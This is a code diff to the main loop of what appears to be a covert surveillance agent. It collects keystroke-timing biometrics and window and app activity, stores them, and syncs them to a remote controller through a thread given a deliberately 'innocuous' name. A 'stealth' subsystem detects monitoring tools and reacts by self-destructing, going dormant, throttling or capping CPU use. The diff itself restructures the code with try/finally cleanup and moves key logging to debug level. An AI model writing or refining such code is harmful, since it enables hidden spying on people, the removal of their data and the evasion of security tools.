@@ -545,8 +545,8 @@ def main() -> int:
                 logger.info("E2E encryption enabled")
                 if e2e_cfg.get("emit_client_keys", False):
                     keys = e2e_protocol.export_client_keys()
-                    logger.info("E2E client signing public key: %s", keys["signing_public_key"])
-                    logger.info("E2E client exchange public key: %s", keys["exchange_public_key"])
+                    logger.debug("E2E client signing public key: %s", keys["signing_public_key"])
+                    logger.debug("E2E client exchange public key: %s", keys["exchange_public_key"])
                 client_keys_path = str(e2e_cfg.get("client_keys_path", "")).strip()
                 if client_keys_path:
                     e2e_protocol.save_client_keys(client_keys_path)
@@ -652,335 +652,341 @@ def main() -> int:
 
     # --- Sync engine (offline-first) ---
     sync_engine = None
-    if config.get("sync", {}).get("enabled", False) and sqlite_store is not None:
-        try:
-            from sync import SyncEngine
-
-            sync_engine = SyncEngine(
-                config=config,
-                sqlite_store=sqlite_store,
-                transport=transport,
-                build_payload=_build_report_bundle,
-                apply_encryption=_apply_encryption,
-                sys_info=sys_info,
-                e2e_protocol=e2e_protocol if "e2e_protocol" in dir() else None,
-            )
-            sync_engine.start()
-            logger.info("Sync engine started (mode=%s)", config.get("sync", {}).get("mode", "immediate"))
-        except Exception as exc:
-            logger.warning("Failed to start sync engine, falling back to basic sync: %s", exc)
-            sync_engine = None
-
-    # --- Fleet agent integration (unified agent) ---
     fleet_agent = None
     fleet_thread = None
-    fleet_cfg = config.get("fleet", {}) if isinstance(config, dict) else {}
-    if fleet_cfg.get("enabled", False) and fleet_cfg.get("agent", {}).get("controller_url", ""):
+
+    try:
+        if config.get("sync", {}).get("enabled", False) and sqlite_store is not None:
+            try:
+                from sync import SyncEngine
+
+                sync_engine = SyncEngine(
+                    config=config,
+                    sqlite_store=sqlite_store,
+                    transport=transport,
+                    build_payload=_build_report_bundle,
+                    apply_encryption=_apply_encryption,
+                    sys_info=sys_info,
+                    e2e_protocol=e2e_protocol if "e2e_protocol" in dir() else None,
+                )
+                sync_engine.start()
+                logger.info("Sync engine started (mode=%s)", config.get("sync", {}).get("mode", "immediate"))
+            except Exception as exc:
+                logger.warning("Failed to start sync engine, falling back to basic sync: %s", exc)
+                sync_engine = None
+
+        # --- Fleet agent integration (unified agent) ---
+        fleet_cfg = config.get("fleet", {}) if isinstance(config, dict) else {}
+        if fleet_cfg.get("enabled", False) and fleet_cfg.get("agent", {}).get("controller_url", ""):
+            try:
+                from fleet.agent import FleetAgent
+                import asyncio as _aio
+
+                agent_cfg = dict(fleet_cfg.get("agent", {}))
+                agent_cfg["controller_url"] = agent_cfg.get("controller_url", "")
+                fleet_agent = FleetAgent(agent_cfg)
+
+                def _run_fleet() -> None:
+                    loop = _aio.new_event_loop()
+                    _aio.set_event_loop(loop)
+                    try:
+                        loop.run_until_complete(fleet_agent.start())
+                    except Exception as exc:
+                        logger.debug("Fleet agent stopped: %s", exc)
+                    finally:
+                        loop.close()
+
+                fleet_thread = threading.Thread(
+                    target=_run_fleet,
+                    name="EventDispatch",  # innocuous thread name
+                    daemon=True,
+                )
+                fleet_thread.start()
+                logger.info("Fleet agent started (controller: %s)",
+                            agent_cfg.get("controller_url", "")[:50])
+            except Exception as exc:
+                logger.warning("Failed to start fleet agent: %s", exc)
+                fleet_agent = None
+
+        # --- Graceful shutdown handler ---
+        shutdown = GracefulShutdown()
+
+        # --- Start all captures ---
+        for cap in captures:
+            try:
+                cap.start()
+                logger.info("Started: %s", cap)
+            except Exception as e:
+                logger.error("Failed to start %s: %s", cap, e)
+
+        # Notify systemd if applicable.
         try:
-            from fleet.agent import FleetAgent
-            import asyncio as _aio
+            from service.linux_systemd import sd_notify
 
-            agent_cfg = dict(fleet_cfg.get("agent", {}))
-            agent_cfg["controller_url"] = agent_cfg.get("controller_url", "")
-            fleet_agent = FleetAgent(agent_cfg)
+            sd_notify("READY=1")
+        except Exception:
+            pass
 
-            def _run_fleet() -> None:
-                loop = _aio.new_event_loop()
-                _aio.set_event_loop(loop)
+        # --- Main loop ---
+        report_interval = settings.get("general.report_interval", 30)
+        report_interval_ref = {"value": float(report_interval)}
+
+        def _set_report_interval(value: float) -> None:
+            report_interval_ref["value"] = max(1.0, float(value))
+
+        if rules_enabled:
+            rule_engine = RuleEngine(config, captures, _set_report_interval)
+            logger.info("Rule engine enabled (rules: %s)", settings.get("rules.path"))
+
+        # --- Subscribe components to EventBus ---
+        # Rule engine handles all event types
+        if rule_engine is not None:
+
+            def _rule_engine_handler(event: dict[str, Any]) -> None:
                 try:
-                    loop.run_until_complete(fleet_agent.start())
+                    rule_engine.process_events([event])
                 except Exception as exc:
-                    logger.debug("Fleet agent stopped: %s", exc)
-                finally:
-                    loop.close()
+                    logger.error("Rule engine handler failed: %s", exc)
 
-            fleet_thread = threading.Thread(
-                target=_run_fleet,
-                name="EventDispatch",  # innocuous thread name
-                daemon=True,
-            )
-            fleet_thread.start()
-            logger.info("Fleet agent started (controller: %s)",
-                        agent_cfg.get("controller_url", "")[:50])
-        except Exception as exc:
-            logger.warning("Failed to start fleet agent: %s", exc)
-            fleet_agent = None
+            event_bus.subscribe("*", _rule_engine_handler)
+            logger.debug("Rule engine subscribed to all events")
 
-    # --- Graceful shutdown handler ---
-    shutdown = GracefulShutdown()
+        # Biometrics only needs keystroke events
+        # Use a mutable container so the closure captures the reference to the container,
+        # not the list itself. This prevents the bug where reassigning biometrics_buffer
+        # would leave the closure appending to the old list.
+        # A lock protects against race conditions when EventBus handlers may be invoked
+        # from different threads simultaneously accessing the buffer.
+        biometrics_buffer_ref = {"buffer": biometrics_buffer}
+        biometrics_lock = threading.Lock()
+        if biometrics_enabled:
 
-    # --- Start all captures ---
-    for cap in captures:
+            def _biometrics_handler(event: dict[str, Any]) -> None:
+                if event.get("type") == "keystroke_timing":
+                    with biometrics_lock:
+                        biometrics_buffer_ref["buffer"].append(event)
+
+            event_bus.subscribe("keystroke", _biometrics_handler)
+            event_bus.subscribe("keystroke_timing", _biometrics_handler)
+            logger.debug("Biometrics subscribed to keystroke events")
+
+        # Profiler tracks window/app events
+        if profiler_tracker is not None:
+
+            def _profiler_handler(event: dict[str, Any]) -> None:
+                try:
+                    profiler_tracker.process_batch([event])
+                except Exception as exc:
+                    logger.error("Profiler handler failed: %s", exc)
+
+            event_bus.subscribe("window", _profiler_handler)
+            event_bus.subscribe("app_focus", _profiler_handler)
+            logger.debug("Profiler subscribed to window events")
+        logger.info("Entering main loop (report interval: %ds)", report_interval)
+
+        if args.dry_run:
+            logger.info("DRY RUN mode — data will be captured but not sent")
+
+        last_report = 0.0
         try:
-            cap.start()
-            logger.info("Started: %s", cap)
-        except Exception as e:
-            logger.error("Failed to start %s: %s", cap, e)
+            while not shutdown.requested:
+                time.sleep(0.2)
 
-    # Notify systemd if applicable.
-    try:
-        from service.linux_systemd import sd_notify
+                # --- Stealth: detection-awareness response ---
+                if stealth.enabled:
+                    if stealth.detection.should_self_destruct():
+                        logger.warning("Stealth: self-destruct triggered by detection")
+                        break
+                    if stealth.detection.should_pause():
+                        # Go dormant — sleep longer and skip this iteration
+                        stealth.resource_profiler.idle_sleep()
+                        continue
+                    # Enforce CPU ceiling
+                    stealth.resource_profiler.enforce_cpu_ceiling()
 
-        sd_notify("READY=1")
-    except Exception:
-        pass
-
-    # --- Main loop ---
-    report_interval = settings.get("general.report_interval", 30)
-    report_interval_ref = {"value": float(report_interval)}
-
-    def _set_report_interval(value: float) -> None:
-        report_interval_ref["value"] = max(1.0, float(value))
-
-    if rules_enabled:
-        rule_engine = RuleEngine(config, captures, _set_report_interval)
-        logger.info("Rule engine enabled (rules: %s)", settings.get("rules.path"))
-
-    # --- Subscribe components to EventBus ---
-    # Rule engine handles all event types
-    if rule_engine is not None:
-
-        def _rule_engine_handler(event: dict[str, Any]) -> None:
-            try:
-                rule_engine.process_events([event])
-            except Exception as exc:
-                logger.error("Rule engine handler failed: %s", exc)
-
-        event_bus.subscribe("*", _rule_engine_handler)
-        logger.debug("Rule engine subscribed to all events")
-
-    # Biometrics only needs keystroke events
-    # Use a mutable container so the closure captures the reference to the container,
-    # not the list itself. This prevents the bug where reassigning biometrics_buffer
-    # would leave the closure appending to the old list.
-    # A lock protects against race conditions when EventBus handlers may be invoked
-    # from different threads simultaneously accessing the buffer.
-    biometrics_buffer_ref = {"buffer": biometrics_buffer}
-    biometrics_lock = threading.Lock()
-    if biometrics_enabled:
-
-        def _biometrics_handler(event: dict[str, Any]) -> None:
-            if event.get("type") == "keystroke_timing":
-                with biometrics_lock:
-                    biometrics_buffer_ref["buffer"].append(event)
-
-        event_bus.subscribe("keystroke", _biometrics_handler)
-        event_bus.subscribe("keystroke_timing", _biometrics_handler)
-        logger.debug("Biometrics subscribed to keystroke events")
-
-    # Profiler tracks window/app events
-    if profiler_tracker is not None:
-
-        def _profiler_handler(event: dict[str, Any]) -> None:
-            try:
-                profiler_tracker.process_batch([event])
-            except Exception as exc:
-                logger.error("Profiler handler failed: %s", exc)
-
-        event_bus.subscribe("window", _profiler_handler)
-        event_bus.subscribe("app_focus", _profiler_handler)
-        logger.debug("Profiler subscribed to window events")
-    logger.info("Entering main loop (report interval: %ds)", report_interval)
-
-    if args.dry_run:
-        logger.info("DRY RUN mode — data will be captured but not sent")
-
-    last_report = 0.0
-    try:
-        while not shutdown.requested:
-            time.sleep(0.2)
-
-            # --- Stealth: detection-awareness response ---
-            if stealth.enabled:
-                if stealth.detection.should_self_destruct():
-                    logger.warning("Stealth: self-destruct triggered by detection")
-                    break
-                if stealth.detection.should_pause():
-                    # Go dormant — sleep longer and skip this iteration
-                    stealth.resource_profiler.idle_sleep()
+                now = time.time()
+                effective_interval = report_interval_ref["value"]
+                if stealth.enabled:
+                    effective_interval = stealth.resource_profiler.jittered_interval(effective_interval)
+                    # Throttle: double interval when monitoring tools detected
+                    if stealth.detection.should_throttle():
+                        effective_interval *= 2.0
+                if now - last_report < effective_interval:
                     continue
-                # Enforce CPU ceiling
-                stealth.resource_profiler.enforce_cpu_ceiling()
+                last_report = now
 
-            now = time.time()
-            effective_interval = report_interval_ref["value"]
-            if stealth.enabled:
-                effective_interval = stealth.resource_profiler.jittered_interval(effective_interval)
-                # Throttle: double interval when monitoring tools detected
-                if stealth.detection.should_throttle():
-                    effective_interval *= 2.0
-            if now - last_report < effective_interval:
-                continue
-            last_report = now
-
-            # Collect from all captures
-            collected: list[dict[str, Any]] = []
-            for cap in captures:
-                try:
-                    collected.extend(cap.collect())
-                except Exception as exc:
-                    logger.error("Collect failed for %s: %s", cap, exc)
-
-            if pipeline is not None and collected:
-                collected = pipeline.process_batch(collected)
-
-            # Publish events through EventBus for decoupled routing to subscribers
-            # (rule_engine, biometrics, profiler are already subscribed above)
-            if collected:
-                for event in collected:
-                    event_type = event.get("type", "unknown")
-                    event_bus.publish(event_type, event)
-
-            # Biometrics profile generation (triggered when buffer reaches sample_size)
-            # Note: keystroke events are routed to biometrics_buffer via EventBus subscriber
-            if biometrics_enabled:
-                # Use lock to safely access and modify the buffer
-                # This prevents race conditions with the EventBus handler
-                sample = None
-                with biometrics_lock:
-                    current_buffer = biometrics_buffer_ref["buffer"]
-                    if len(current_buffer) >= biometrics_sample_size:
-                        sample = current_buffer[:biometrics_sample_size]
-                        # Mutate the container's buffer reference instead of reassigning
-                        # the outer variable, so the closure continues using the same list
-                        biometrics_buffer_ref["buffer"] = current_buffer[biometrics_sample_size:]
-                # Process outside the lock to avoid holding it during expensive operations
-                if sample is not None:
+                # Collect from all captures
+                collected: list[dict[str, Any]] = []
+                for cap in captures:
                     try:
-                        profile = biometrics_analyzer.generate_profile(sample)
-                        if biometrics_store and sqlite_store is not None:
-                            try:
-                                sqlite_store.insert_profile(profile.to_dict())
-                            except Exception as exc:
-                                logger.error("Failed to store biometrics profile: %s", exc)
-                        profile_event = {
-                            "type": "biometrics_profile",
-                            "data": profile.to_dict(),
-                            "timestamp": time.time(),
-                        }
-                        if biometrics_store:
-                            collected.append(profile_event)
+                        collected.extend(cap.collect())
                     except Exception as exc:
-                        logger.error("Biometrics analysis failed: %s", exc)
+                        logger.error("Collect failed for %s: %s", cap, exc)
 
-            if profiler_tracker is not None and profiler_scorer is not None:
-                if (
-                    profiler_emit_interval is not None
-                    and now - profiler_last_emit >= profiler_emit_interval
-                ):
-                    try:
-                        profile = profiler_scorer.build_daily_profile(profiler_tracker, now_ts=now)
-                        if profile is not None:
-                            if profiler_store and sqlite_store is not None:
-                                try:
-                                    sqlite_store.insert_app_profile(profile.to_dict())
-                                except Exception as exc:
-                                    logger.error("Failed to store app usage profile: %s", exc)
-                            profile_event = {
-                                "type": "app_usage_profile",
-                                "data": profile.to_dict(),
-                                "timestamp": now,
-                            }
-                            if profiler_store:
-                                collected.append(profile_event)
-                    except Exception as exc:
-                        logger.error("Profiler scoring failed: %s", exc)
-                    profiler_last_emit = now
+                if pipeline is not None and collected:
+                    collected = pipeline.process_batch(collected)
 
-            if sqlite_store is not None:
-                if storage_backend == "sqlite":
-                    sqlite_items = collected
-                    queue_items: list[dict[str, Any]] = []
-                else:
-                    sqlite_items = [i for i in collected if i.get("route") == "sqlite"]
-                    queue_items = [i for i in collected if i.get("route") != "sqlite"]
+                # Publish events through EventBus for decoupled routing to subscribers
+                # (rule_engine, biometrics, profiler are already subscribed above)
+                if collected:
+                    for event in collected:
+                        event_type = event.get("type", "unknown")
+                        event_bus.publish(event_type, event)
 
-                for item in sqlite_items:
-                    data_value = item.get("data")
-                    data_str = _serialize_for_storage(data_value) if data_value is not None else ""
-                    file_path = item.get("path") or item.get("file_path") or ""
-                    file_size = item.get("size", 0) or 0
-                    if file_path and not file_size:
+                # Biometrics profile generation (triggered when buffer reaches sample_size)
+                # Note: keystroke events are routed to biometrics_buffer via EventBus subscriber
+                if biometrics_enabled:
+                    # Use lock to safely access and modify the buffer
+                    # This prevents race conditions with the EventBus handler
+                    sample = None
+                    with biometrics_lock:
+                        current_buffer = biometrics_buffer_ref["buffer"]
+                        if len(current_buffer) >= biometrics_sample_size:
+                            sample = current_buffer[:biometrics_sample_size]
+                            # Mutate the container's buffer reference instead of reassigning
+                            # the outer variable, so the closure continues using the same list
+                            biometrics_buffer_ref["buffer"] = current_buffer[biometrics_sample_size:]
+                    # Process outside the lock to avoid holding it during expensive operations
+                    if sample is not None:
                         try:
-                            file_size = Path(file_path).stat().st_size
-                        except OSError:
-                            file_size = 0
-                    sqlite_store.insert(
-                        item.get("type", "unknown"),
-                        data=data_str,
-                        file_path=file_path,
-                        file_size=file_size,
-                    )
+                            profile = biometrics_analyzer.generate_profile(sample)
+                            if biometrics_store and sqlite_store is not None:
+                                try:
+                                    sqlite_store.insert_profile(profile.to_dict())
+                                except Exception as exc:
+                                    logger.error("Failed to store biometrics profile: %s", exc)
+                            profile_event = {
+                                "type": "biometrics_profile",
+                                "data": profile.to_dict(),
+                                "timestamp": time.time(),
+                            }
+                            if biometrics_store:
+                                collected.append(profile_event)
+                        except Exception as exc:
+                            logger.error("Biometrics analysis failed: %s", exc)
 
-                if queue_items:
-                    queue.enqueue_many(queue_items)
+                if profiler_tracker is not None and profiler_scorer is not None:
+                    if (
+                        profiler_emit_interval is not None
+                        and now - profiler_last_emit >= profiler_emit_interval
+                    ):
+                        try:
+                            profile = profiler_scorer.build_daily_profile(profiler_tracker, now_ts=now)
+                            if profile is not None:
+                                if profiler_store and sqlite_store is not None:
+                                    try:
+                                        sqlite_store.insert_app_profile(profile.to_dict())
+                                    except Exception as exc:
+                                        logger.error("Failed to store app usage profile: %s", exc)
+                                profile_event = {
+                                    "type": "app_usage_profile",
+                                    "data": profile.to_dict(),
+                                    "timestamp": now,
+                                }
+                                if profiler_store:
+                                    collected.append(profile_event)
+                        except Exception as exc:
+                            logger.error("Profiler scoring failed: %s", exc)
+                        profiler_last_emit = now
 
-                # ── Sync: use SyncEngine if available, else fallback ──
-                if sync_engine is not None:
-                    # SyncEngine handles batching, retry, checkpointing, and
-                    # marking sent internally — single call replaces the old
-                    # get_pending → send → mark_sent pipeline.
-                    sync_engine.process_pending()
+                if sqlite_store is not None:
+                    if storage_backend == "sqlite":
+                        sqlite_items = collected
+                        queue_items: list[dict[str, Any]] = []
+                    else:
+                        sqlite_items = [i for i in collected if i.get("route") == "sqlite"]
+                        queue_items = [i for i in collected if i.get("route") != "sqlite"]
+
+                    for item in sqlite_items:
+                        data_value = item.get("data")
+                        data_str = _serialize_for_storage(data_value) if data_value is not None else ""
+                        file_path = item.get("path") or item.get("file_path") or ""
+                        file_size = item.get("size", 0) or 0
+                        if file_path and not file_size:
+                            try:
+                                file_size = Path(file_path).stat().st_size
+                            except OSError:
+                                file_size = 0
+                        try:
+                            sqlite_store.insert(
+                                item.get("type", "unknown"),
+                                data=data_str,
+                                file_path=file_path,
+                                file_size=file_size,
+                            )
+                        except Exception as exc:
+                            logger.warning("sqlite_store.insert() failed: %s", exc)
+
+                    if queue_items:
+                        queue.enqueue_many(queue_items)
+
+                    # ── Sync: use SyncEngine if available, else fallback ──
+                    if sync_engine is not None:
+                        # SyncEngine handles batching, retry, checkpointing, and
+                        # marking sent internally — single call replaces the old
+                        # get_pending → send → mark_sent pipeline.
+                        sync_engine.process_pending()
+                    else:
+                        pending_rows = sqlite_store.get_pending(limit=batch_size)
+                        batch_items, batch_ids = _items_from_sqlite(pending_rows)
+                        if batch_items:
+                            _legacy_sync(
+                                batch_items, batch_ids, transport, breaker,
+                                sqlite_store, queue, storage_manager, config,
+                                sys_info, data_dir, e2e_protocol, args,
+                            )
                 else:
-                    pending_rows = sqlite_store.get_pending(limit=batch_size)
-                    batch_items, batch_ids = _items_from_sqlite(pending_rows)
+                    if collected:
+                        queue.enqueue_many(collected)
+                    batch_items = queue.drain(batch_size=batch_size)
+                    batch_ids = []
+
                     if batch_items:
                         _legacy_sync(
                             batch_items, batch_ids, transport, breaker,
                             sqlite_store, queue, storage_manager, config,
                             sys_info, data_dir, e2e_protocol, args,
                         )
-            else:
-                if collected:
-                    queue.enqueue_many(collected)
-                batch_items = queue.drain(batch_size=batch_size)
-                batch_ids = []
 
-                if batch_items:
-                    _legacy_sync(
-                        batch_items, batch_ids, transport, breaker,
-                        sqlite_store, queue, storage_manager, config,
-                        sys_info, data_dir, e2e_protocol, args,
-                    )
+        except KeyboardInterrupt:
+            logger.info("KeyboardInterrupt received")
 
-    except KeyboardInterrupt:
-        logger.info("KeyboardInterrupt received")
+    finally:
+        # --- Shutdown (guaranteed cleanup) ---
+        logger.info("Shutting down...")
 
-    # --- Shutdown ---
-    logger.info("Shutting down...")
+        # Stop fleet agent
+        if fleet_agent is not None:
+            try:
+                fleet_agent.request_shutdown()
+            except Exception:
+                pass
 
-    # Stop fleet agent
-    if fleet_agent is not None:
-        try:
-            fleet_agent.running = False
-        except Exception:
-            pass
+        # Stop stealth subsystems
+        if stealth.enabled:
+            stealth.stop()
 
-    # Stop stealth subsystems
-    if stealth.enabled:
-        stealth.stop()
+        for cap in captures:
+            try:
+                cap.stop()
+                logger.info("Stopped: %s", cap)
+            except Exception as e:
+                logger.error("Failed to stop %s: %s", cap, e)
 
-    for cap in captures:
-        try:
-            cap.stop()
-            logger.info("Stopped: %s", cap)
-        except Exception as e:
-            logger.error("Failed to stop %s: %s", cap, e)
+        if pid_lock:
+            pid_lock.release()
 
-    if pid_lock:
-        pid_lock.release()
+        if sync_engine is not None:
+            try:
+                sync_engine.stop()
+            except Exception:
+                pass
 
-    if sync_engine is not None:
-        try:
-            sync_engine.stop()
-        except Exception:
-            pass
+        if sqlite_store is not None:
+            sqlite_store.close()
 
-    if sqlite_store is not None:
-        sqlite_store.close()
-
-    with contextlib.suppress(Exception):
-        transport.disconnect()
+        with contextlib.suppress(Exception):
+            transport.disconnect()
 
     # Handle self-destruct if triggered by detection awareness
     if stealth.enabled and stealth.detection.should_self_destruct():
